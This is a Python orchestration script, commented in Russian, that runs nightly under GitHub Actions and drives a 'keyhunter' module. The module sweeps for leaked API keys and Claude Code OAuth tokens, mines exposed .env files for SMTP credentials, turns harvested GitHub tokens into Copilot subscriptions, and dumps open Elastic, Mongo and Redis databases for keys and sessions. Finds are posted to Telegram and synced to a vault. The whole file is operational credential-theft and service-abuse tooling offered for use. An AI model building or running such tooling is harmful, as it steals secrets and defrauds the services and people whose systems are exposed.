#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
night_run — ночной прогон ПОЛНОГО keyhunter для GitHub Actions.

Эквивалент одного цикла монитора:
  1. run_once(post=True)      — все источники + экстрактор + валидация + TG
  2. cc_proxy_sweep(cycle)    — автоохота на Max-слоты CC-OAuth (setup_token)
  3. env_smtp_sweep(cycle)    — открытые .env с почтовыми кредами -> подписки
  4. copilot_sweep(cycle)     — github-токены стора -> Copilot-подписки
  5. opendb_sweep(cycle)      — открытые Elastic/Mongo/Redis = сырые дампы
  6. self_keysmith(cycle)     — самодобыча ключей источников (fofa и ко)
  7. favicon_pivot_sweep      — pivot по favicon-хэшам (каждый 4-й цикл)
  8. vault_push_finds         — синк находок с локальным ботом (каждый 4-й)
  9. cmd_recheck              — ревалидация стора (каждый 8-й цикл)

cycle = время // 1800 (кратно cron */30) — растёт от запуска к запуску,
странично прошаривает shodan-пул свипов.
"""

import time

import keyhunter as kh

CYCLE = int(time.time() // 1800)

kh.log("=== night_run: цикл #%d (полный keyhunter) ===" % CYCLE)

try:
    kh.run_once(post=True)
except Exception as e:
    kh.log("run_once err: %s: %s" % (type(e).__name__, e))

try:
    fat = kh.cc_proxy_sweep(CYCLE)
    if fat:
        kh.log("  🔥 cc-sweep: %d Max-слотов!" % len(fat))
except Exception as e:
    kh.log("cc-sweep err: %s" % e)

try:
    env = kh.env_smtp_sweep(CYCLE)
    if env:
        kh.log("  📧 env-smtp sweep: %d находок" % len(env))
except Exception as e:
    kh.log("env-smtp err: %s" % e)

# copilot: github-токены стора -> подписка Copilot (обмен через
# copilot_internal — дешёвый свип по уже найденным токенам)
try:
    cop = kh.copilot_sweep(CYCLE)
    if cop:
        kh.log("  🤖 copilot-sweep: %d находок" % len(cop))
except Exception as e:
    kh.log("copilot-sweep err: %s" % e)

# opendb: открытые базы = дампы с ключами/сессиями внутри
try:
    odb = kh.opendb_sweep(CYCLE)
    if odb:
        kh.log("  🗄️ opendb-sweep: %d находок" % len(odb))
except Exception as e:
    kh.log("opendb-sweep err: %s" % e)

# keysmith: самодобыча недостающих ключей источников
try:
    kh.self_keysmith(CYCLE)
except Exception as e:
    kh.log("keysmith err: %s" % e)

# каждый 4-й цикл: favicon-pivot + vault-синк (как в мониторе)
if CYCLE % 4 == 0:
    try:
        kh.favicon_pivot_sweep(CYCLE)
    except Exception as e:
        kh.log("favicon pivot err: %s" % e)
    try:
        kh.vault_push_finds()
    except Exception as e:
        kh.log("vault push err: %s" % e)

# каждый 8-й цикл: ревалидация стора (мёртвые вон, no_balance ревайв)
if CYCLE % 8 == 0:
    try:
        kh.cmd_recheck()
    except Exception as e:
        kh.log("recheck err: %s" % e)

kh.log("=== night_run: цикл #%d завершён ===" % CYCLE)

# P0-ФИКС: некоторые треди keyhunter (висячие сокеты без таймаута) не дают
# процессу выйти -> джоб висит 20+ мин -> таймаут убивает ДО коммита стейта
# -> дедуп не сохраняется -> дубли в TG. Выходим жёстко, немедленно.
import os as _os

_os._exit(0)
